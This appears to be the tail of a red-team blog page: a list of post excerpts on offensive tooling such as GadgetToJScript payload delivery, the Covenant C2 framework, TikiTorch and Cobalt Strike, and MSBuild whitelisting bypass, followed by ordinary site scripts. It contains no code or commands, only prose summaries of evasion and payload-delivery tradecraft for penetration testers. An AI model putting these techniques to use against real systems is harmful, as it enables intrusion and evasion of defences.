              </span>
              <div class="media-content hide-xs font-merryweather"><p>Back in April 2017, <a href="https://twitter.com/tiraniddo">James Forshaw</a> (hail) released a tool called <a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a> which was capable of generating JScript, VBA and VBScript that could run an arbitrary .NET assembly (mostly) from memory.  Although not its intended purpose, it was quickly picked up by tool developers, pentesters, red teamers, bad guys etc and used to deliver .NET-based payloads via methods such as <a href="https://en.wikipedia.org/wiki/HTML_Application">HTA</a>.</p>

<p>Microsoft and other AV vendors started writing signatures for DN2JS, and we all know how that makes James feel (Exhibits <a href="https://twitter.com/tiraniddo/status/1204970332127236097">A</a> and <a href="https://twitter.com/tiraniddo/status/951489836027990019">B</a>).  Microsoft even went as far as to make some under-the-hood changes from Windows 10 / 2K16 to mitigate the use of DN2JS payloads, as evidenced by these notes in Covenant:</p>

<figure>
    <img src="https://rastamouse.me/images/gadgettojscript/covenant.png"/> 
</figure>


<p>These factors seem to have resulted in a decline in prevalence for these payloads, or at least, they&rsquo;re not hyped about so much.</p>

<p>Enter <a href="https://github.com/med0x2e/GadgetToJScript">GadgetToJScript</a> by <a href="https://twitter.com/med0x2e">Mohamed El Azaar</a>.  This tool generates .NET serialized gadgets that can trigger assembly load/execution when deserialized via BinaryFormatter from JScript, VBScript or VBA.  So it once again, allows for a similar tradecraft as was originally provided by DN2JS <strong>and</strong> it works on Windows 10.</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2019/12/covenant-tasks-101/">
                <h3 class="media-heading">Covenant Tasks 101</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Dec 12, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>Covenant is a .NET Command and Control framework that boasts a number of exciting features for red teamers.  The Covenant implants are called Grunts, which are capable of executing post-exploitation <strong>&ldquo;tasks&rdquo;</strong> on a compromised machine.  Covenant v0.1 released with a number of useful tasks, but the repository has really <a href="https://github.com/cobbr/Covenant/graphs/commit-activity">grown</a> from contributions from the Covenant community.</p>

<p>Tasks can extend the functionality and versatility of a Grunt, such as providing new lateral movement, persistence or privilege escalation techniques and more.  Contributing a Task to Covenant is an excellent way to support the project.</p>

<p>This post will provide an introduction for those wishing to create and contribute new Tasks.</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2019/09/mwr-labs-c3-first-look/">
                <h3 class="media-heading">MWR Labs: C3 - First Look</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Sep 9, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>In this blog post I&rsquo;m going to cover my first impressions of MWR Labs C3 project, through installation and setup to usage in a basic scenario.</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2019/08/tikiservice/">
                <h3 class="media-heading">TikiService</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Aug 8, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p><a href="https://github.com/rasta-mouse/TikiTorch/tree/master/TikiService">TikiService</a> is a new .NET Service Binary that allows you to run a TikiTorch payload via the Service Control Manager (à la PsExec).  <a href="https://github.com/rasta-mouse/TikiTorch/blob/master/Aggressor/TikiTorch.cna">TikiTorch.cna</a> has also been updated to create a new Cobalt Strike function: <code>tikiexec</code>, that automates its use.  This blog post provides a brief overview and usage examples.</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2019/08/covenant-donut-tikitorch/">
                <h3 class="media-heading">Covenant, Donut, TikiTorch</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Aug 8, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>Covenant <a href="https://github.com/cobbr/Covenant/commit/bde0df315f26b01a4ef5c5c00679b1e150998a35">v0.1</a> was first released in February 2019 and has since received a lot of really good updates.  <a href="https://github.com/cobbr/Covenant/commit/a2df643e01aea3ad7330bdba88ddd560692e46b4">v0.2</a> was released in May which added p2p comms over SMB named pipes, and <a href="https://github.com/cobbr/Covenant/commit/abcba78006c29b687f6e1a43a1ea1793784714fd">v0.3</a> was released in August which added a brand new web interface.  Even though it&rsquo;s such a young project, it has really proven itself to be a capable tool for offensive operators.  I&rsquo;ve not taken a look at Covenant since v0.1.x but since providing some new <a href="https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Persistence/WMI.cs">additions</a> to SharpSploit, it kinda got my geek going.  One of my areas of interest is weaponising the Grunt stager.</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2019/06/the-return-of-aggressor/">
                <h3 class="media-heading">The Return of Aggressor</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Jun 6, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>FortyNorth Security recently <a href="https://www.fortynorthsecurity.com/aggressive-msbuild-bypass-detection/">posted an article</a> detailing the process for leveraging MSBuild to execute unmanaged PowerShell, and automating it in Aggressor script for Cobalt Strike users.  Being a native binary in the Windows OS, the use of MSBuild is a <a href="https://lolbas-project.github.io/lolbas/Binaries/Msbuild/">common AWL bypass technique</a>, which is handy in relatively well locked down environments.</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2019/06/tikivader/">
                <h3 class="media-heading">TikiVader</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Jun 6, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>I&rsquo;ve added a new experimental project to <a href="https://github.com/rasta-mouse/TikiTorch">TikiTorch</a>, called <a href="https://github.com/rasta-mouse/TikiTorch/tree/master/TikiVader">TikiVader</a>.  I originally thought of &ldquo;vader&rdquo; as a play-on for &ldquo;evade&rdquo;/&ldquo;evader&rdquo;, until I realised TikiVader was never meant to evade anything&hellip; but nevermind 😒</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2019/06/tikispawn-msbuild/">
                <h3 class="media-heading">TikiSpawn &amp; MSBuild</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Jun 6, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>The main impetus behind this post was me experimenting with ways to leverage TikiSpawn with some of the popular <a href="https://lolbas-project.github.io">lolbins</a>.</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
      </div>
    </div>
    <div class="modal-footer">
      <p class="results-count text-medium"
         data-message-zero="no post found"
         data-message-one="1 post found"
         data-message-other="{n} posts found">
         36 posts found
      </p>
    </div>
  </div>
</div>
    
  
    
    <div id="cover" style="background-image:url('https://rastamouse.me/images/cover.jpg');"></div>
  


    
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/highlight.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.js"></script>


<script src="https://rastamouse.me/js/script-wl33z0n6ocaypepiqrazthtivfrliqijej4rq8ek8gvrv1awftmgjuv8k4zc.min.js"></script>

<script>
$(document).ready(function() {
  hljs.configure({ classPrefix: '', useBR: false });
  $('pre.code-highlight').each(function(i, block) {
    var code = "";
    hljs.highlightAuto(block.innerText).value.split(/\r\n|\r|\n/).forEach(function(line) {
      code += "<span class=\"line\">" + line + "</span><br>";
    });
    if (code.length > 0) {
      block.innerHTML = code;  
    }
  });
  $('pre > code').each(function(i, block) {
    $(this).addClass('codeblock');
    hljs.highlightBlock(block);
  });
});
</script>

  
    
      <script>
        var disqus_config = function () {
          this.page.url = 'https:\/\/rastamouse.me\/2018\/02\/vhd-to-da\/';
          
            this.page.identifier = '\/2018\/02\/vhd-to-da\/'
          
        };
        (function() {
          
          
          if (window.location.hostname == "localhost") {
            return;
          }
          var d = document, s = d.createElement('script');
          var disqus_shortname = 'rastamouse';
          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';

          s.setAttribute('data-timestamp', +new Date());
          (d.head || d.body).appendChild(s);
        })();
      </script>
    
  





    
  </body>
</html>

